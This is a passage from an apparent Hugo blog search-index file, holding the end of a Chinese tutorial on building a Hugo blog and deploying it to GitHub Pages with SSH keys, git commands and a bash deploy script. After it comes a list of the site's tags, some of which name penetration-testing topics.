简单来说就是可以把md文件和图片置于同一个目录下（正常引用图片需要放在static目录下），其中images目录保存index.md所有引用图片。这样做的好处是，方便以后查找和做导出。\n4、编辑博客内容 使用markdown编辑文本，放在content目录下。\n5、本地生成 生成静态网页到public目录下：\n hugo\n 运行本地web服务：\n hugo server\n 6、部署到github 6.1 新建项目 创建github仓库，Repository name 是 用户名.github.io：\n其他的默认即可\n项目建立成功\n6.2 生成ssh公钥 ssh-keygen -t rsa -C \u0026quot;xxxx@qq.com\u0026quot;\r 查看(根据自己生成结果，查看相应的公钥)\ncat /c/Users/admin/.ssh/id_rsa.pub\r 6.3 将公钥上传到GitHub 点击新建ssh key\n将生成号的公钥复制到这里\n设置好之后，具体如下\n在git中设置邮箱地址和用户名\n git config --global user.email \u0026quot;you@example.com\u0026quot;\rgit config --global user.name \u0026quot;Your Name\u0026quot;\r 初始化仓库\ngit init\r 将所有内容添加到git\ngit add .\r 提交到git 本地\ngit commit -m \u0026quot;我的博客第一次提交\u0026quot;\r 关联到远程git，注意这里需要写你自己的git 地址\ngit remote add origin git@github.com:ad-calcium/ad-calcium.github.io.git\r 推送到远程git\ngit push origin master\r 自动化部署脚本：\n#!/bin/bash\r# 部署到 github pages 脚本\r# 错误时终止脚本\rset -e\r# 删除打包文件夹\r# rm -rf public\r# 打包\rhugo --baseUrl=\u0026quot;https://far-morningstar.github.io/\u0026quot;\r# 进入打包文件夹\rcd public\r# Add changes to git，第一提交需要 git init\r# git init\rgit add .\r# Commit changes.\rmsg=\u0026quot;building site `date`\u0026quot;\rif [ $# -eq 1 ]\rthen msg=\u0026quot;$1\u0026quot;\rfi\rgit commit -m \u0026quot;$msg\u0026quot;\r# 添加远程仓库\rgit remote add origin git@github.com:ad-calcium/ad-calcium.github.io.git\r# 推送到github git push -u origin master\r# 回到原文件夹\rcd ..\r 我这里使用的是windows系统，安装Cmder，可以执行bash脚本： ","id":26,"section":"posts","summary":"1、hugo hugo是基于命令行的静态网站生成工具，使用go语言开发。因此，下载编译好的二进制文件，就可以直接运行，无需安装其它依赖。将hu","tags":["安装博客"],"title":"hugo搭建个人博客","uri":"https://ad-calcium.github.io/2020/07/hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","year":"2020"}],"tags":[{"title":"Confluence ","uri":"https://ad-calcium.github.io/tags/confluence/"},{"title":"exchange","uri":"https://ad-calcium.github.io/tags/exchange/"},{"title":"MSSQL","uri":"https://ad-calcium.github.io/tags/mssql/"},{"title":"MSSQL提权","uri":"https://ad-calcium.github.io/tags/mssql%E6%8F%90%E6%9D%83/"},{"title":"web安全","uri":"https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"title":"web渗透","uri":"https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/"},{"title":"内网","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/"},{"title":"内网渗透","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"内网环境搭建","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"凭据窃取","uri":"https://ad-calcium.github.io/tags/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/"},{"title":"安装博客","uri":"https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/"},{"title":"小技巧","uri":"https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"title":"未授权","uri":"https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/"},{"title":"横向移动","uri":"https://ad-calcium.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"title":"流量代理","uri":"https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/"},{"title":"漏洞复现","uri":"https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"端口复用","uri":"https://ad-calcium.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"},{"title":"软件安装","uri":"https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"title":"钓鱼","uri":"https://ad-calcium.github.io/tags/%E9%92%93%E9%B1%BC/"}]}